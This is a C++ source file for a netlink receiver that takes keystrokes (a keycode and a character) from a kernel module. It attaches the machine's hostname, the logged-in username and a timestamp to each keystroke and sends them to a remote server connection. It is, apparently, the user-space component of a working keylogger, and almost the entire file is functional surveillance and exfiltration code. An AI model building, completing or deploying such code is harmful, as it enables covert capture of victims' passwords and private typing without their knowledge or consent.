#include "NetlinkReceiver.hpp"
#include <fcntl.h>  // For fcntl
#include <thread>
#include <chrono>
#include <limits>
#include <unistd.h>

using namespace std;

NetlinkReceiver::NetlinkReceiver(int protocol, int bufferSize)
        : sock_fd_(-1), receiving_(false), bufferSize_(bufferSize) {
    // Create a netlink socket
    sock_fd_ = socket(PF_NETLINK, SOCK_RAW, protocol);
    if (sock_fd_ < 0) {
        throw runtime_error("Failed to create netlink socket");
    }

    // Initialize the source address structure
    memset(&src_addr_, 0, sizeof(src_addr_));
    src_addr_.nl_family = AF_NETLINK;
    src_addr_.nl_pid = getpid();  // Unique PID for the user-space application

    if (bind(sock_fd_, (struct sockaddr*)&src_addr_, sizeof(src_addr_)) < 0) {
        close(sock_fd_);
        throw runtime_error("Failed to bind netlink socket");
    }

    // Initialize the destination address structure
    memset(&dest_addr_, 0, sizeof(dest_addr_));
    dest_addr_.nl_family = AF_NETLINK;
    dest_addr_.nl_pid = 0;  // Kernel's PID
    dest_addr_.nl_groups = 0;  // Unicast

    // Send an initial message to set the PID in the kernel
    auto *nlh = static_cast<nlmsghdr *>(malloc(NLMSG_SPACE(bufferSize_)));
    if (!nlh) {
        throw runtime_error("Failed to allocate memory for nlmsghdr");
    }

    memset(nlh, 0, NLMSG_SPACE(bufferSize_));
    nlh->nlmsg_len = NLMSG_SPACE(bufferSize_);
    nlh->nlmsg_pid = getpid();  // PID of sending process
    nlh->nlmsg_flags = 0;  // No special flags

    struct iovec iov = { nlh, NLMSG_SPACE(bufferSize_) };
    struct msghdr msg = { (void *)&dest_addr_, sizeof(dest_addr_), &iov, 1, nullptr, 0, 0 };

    // Sending an initial message to kernel
    const char *initial_msg = "Hello, kernel";
    char *payload = (char *)((char *)nlh + NLMSG_HDRLEN);
    strncpy(payload, initial_msg, strlen(initial_msg) + 1);


    if (sendmsg(sock_fd_, &msg, 0) < 0) {
        perror("Failed to send initial message to kernel");
    }

    free(nlh);

    SC = ServerConnection();
    SC.Start();
}


NetlinkReceiver::~NetlinkReceiver() {
    if (sock_fd_ >= 0) {
        close(sock_fd_);
    }
}

void NetlinkReceiver::startReceiving() {
    receiving_.store(true);
    while (receiving_) {
        receiveMessage();
        this_thread::sleep_for(chrono::milliseconds(100)); // Sleep briefly to avoid busy-waiting
    }
}

void NetlinkReceiver::stopReceiving() {
    receiving_.store(false);
}

string GenerateTimestamp() {
    char fmt[64];
    char buf[64];
    struct timeval tv{};
    struct tm *tm;
    gettimeofday(&tv, nullptr);
    tm = localtime(&tv.tv_sec);
    strftime(fmt, sizeof(fmt), "%H:%M:%S:%%06u", tm);
    snprintf(buf, sizeof(buf), fmt, tv.tv_usec);
    return buf;
}

void NetlinkReceiver::receiveMessage() {
    // Set a timeout of 2 seconds for recvmsg
    struct timeval timeout;
    timeout.tv_sec = 2;  // Set 2-second timeout
    timeout.tv_usec = 0; // No microseconds

    // Apply the timeout to the socket
    if (setsockopt(sock_fd_, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
        cerr << "Failed to set socket timeout" << endl;
        return;
    }

    auto *nlh = static_cast<nlmsghdr *>(malloc(NLMSG_SPACE(bufferSize_)));
    if (!nlh) {
        throw runtime_error("Failed to allocate memory for nlmsghdr");
    }

    memset(nlh, 0, NLMSG_SPACE(bufferSize_));
    struct iovec iov = { nlh, NLMSG_SPACE(bufferSize_) };
    struct msghdr msg = { (void *)&dest_addr_, sizeof(dest_addr_), &iov, 1, nullptr, 0, 0 };

    // Receive the message from the kernel
    ssize_t received_bytes = recvmsg(sock_fd_, &msg, 0);

    // Check for errors or timeout
    if (received_bytes < 0) {
        free(nlh);
        return;
    }

    if (received_bytes > 0) {
        // Process the received message
        int keycode;
        char ascii_char;
        memcpy(&keycode, NLMSG_DATA(nlh), sizeof(int));
        memcpy(&ascii_char, static_cast<char*>(NLMSG_DATA(nlh)) + sizeof(int), sizeof(char));

        char hostname[1024];
        char username[1024];
        gethostname(hostname, 1024);
        getlogin_r(username, 1024);
        auto ts = GenerateTimestamp();
        string line;
        line.push_back(ascii_char);
        SC.MakeRequest(make_shared<Request>(line, string(hostname), string(username), ts));
    }

    free(nlh);
}
